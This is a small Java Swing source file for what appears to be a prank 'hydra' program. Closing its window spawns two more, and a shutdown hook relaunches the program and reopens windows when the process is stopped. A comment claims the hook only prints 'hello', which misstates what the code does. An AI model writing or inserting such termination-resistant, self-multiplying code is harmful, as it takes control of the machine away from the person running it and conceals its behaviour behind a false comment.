package Examples;

import java.io.IOException;
import javax.swing.*;

public class Windoww extends JFrame{
    public static int windowcount = 0;
        public Windoww() {
        super("Windowwwww!");
        int width = java.awt.Toolkit.getDefaultToolkit().getScreenSize().width;
        int height = java.awt.Toolkit.getDefaultToolkit().getScreenSize().height;
        int x = (int) (Math.random() * (width - 300));
        int y = (int) (Math.random() * (height - 150));
        setLocation(x, y);
        setSize(300, 150);
        setVisible(true);
        JLabel label = new JLabel("Don't close this window!");
        label.setHorizontalAlignment(JLabel.CENTER);
        getContentPane().add(label);
    
        addWindowListener(new java.awt.event.WindowAdapter() {
            @Override
            public void windowClosing(java.awt.event.WindowEvent windowEvent) {
                new Windoww();
                new Windoww();
                windowcount += 2;
            }
        });
    }
    //if task is killed by task manager, print "hello"
    static {
        Runtime.getRuntime().addShutdownHook(new Thread() {
            @Override
            public void run() {
                try {
                    JavaW.run("Windoww");
                } catch (IOException e) {
                    e.printStackTrace();
                }
                for (int i = 0; i < windowcount; i++) {
                    new Windoww();
                }
                new Windoww();
            }
        });
    }
    public static void main(String[] args) throws IOException {
        JavaW.run("Windoww");
        new Windoww();
    }
    //check if window is unfocused
    public static boolean isWindowFocused() {
        System.out.println(java.awt.Window.getWindows()[0].isFocused());
        return java.awt.Window.getWindows()[0].isFocused();
    }
}
